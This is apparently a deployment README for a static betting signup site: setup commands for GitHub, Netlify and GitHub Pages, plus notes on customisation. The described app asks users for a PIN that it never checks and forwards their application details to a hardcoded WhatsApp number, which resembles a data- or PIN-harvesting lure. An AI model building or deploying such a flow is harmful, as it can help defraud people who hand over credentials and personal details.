# Deploy to Netlify (Free & Simple)

Since this is a fully static website (no backend needed), you can deploy directly to Netlify or GitHub Pages in minutes.

## Prerequisites
- Netlify account (free): https://netlify.com
- Git repository with this project
- GitHub account (optional, but recommended)

## Step 1: Push your code to GitHub

1. Initialize git and commit everything:
```bash
cd "c:\Users\PC\Desktop\website"
git init
git config user.email "your-email@example.com"
git config user.name "Your Name"
git add .
git commit -m "THE MASSIVE WINS: Betting signup with WhatsApp integration"
```

2. Create a GitHub repository at https://github.com/new

3. Push your code:
```bash
git branch -M main
git remote add origin https://github.com/YOUR_USERNAME/website.git
git push -u origin main
```

## Step 2: Deploy to Netlify

1. Go to https://app.netlify.com and sign in with GitHub.
2. Click **Import an existing project** → **GitHub** → select your `website` repo.
3. Configure build settings:
   - **Base directory**: (leave empty)
   - **Build command**: (leave empty — this is static)
   - **Publish directory**: `.` (the root folder)
4. Click **Deploy site**. Netlify will build and deploy in ~1 minute.
5. You'll get a URL like `https://YOUR_SITE.netlify.app` — your site is live!

## Step 3: Test End-to-End

1. Open your Netlify URL on your phone or desktop.
2. Fill out and submit the form.
3. On the PIN page, enter any PIN and click Continue.
4. The app will redirect to WhatsApp with your application details.

## Alternative: Deploy to GitHub Pages (free)

If you prefer GitHub Pages instead:

1. Go to your GitHub repo **Settings** → **Pages**.
2. Set **Source** to `main` branch.
3. GitHub will deploy at `https://YOUR_USERNAME.github.io/website/home.html`

## How It Works

- **No backend needed**: The entire app is frontend-only.
- **WhatsApp integration**: Uses `wa.me/` links to send application details via WhatsApp Web.
- **Data storage**: Saves form data in `localStorage` to persist between pages.
- **PIN verification**: Any PIN works (can be customized in `login.html`).

## Customization

**Change the WhatsApp number** (where applications are sent):
- Edit `login.html`, find `var whatsappNumber = "14192311363"` 
- Replace with your WhatsApp number (include country code, no `+` or spaces).

**Add PIN validation** (optional):
- In `login.html`, replace the `submitPin` function to check the PIN against a hardcoded or API value.

## Troubleshooting

- **WhatsApp link not working**: Ensure the recipient number includes country code (e.g., `14192311363` for `+1-419-231-1363`).
- **Form data not persisting**: Check browser console for `localStorage` errors.
- **Netlify deploy fails**: Ensure `.gitignore` is not blocking critical files; push everything except `.env` and `node_modules/`.

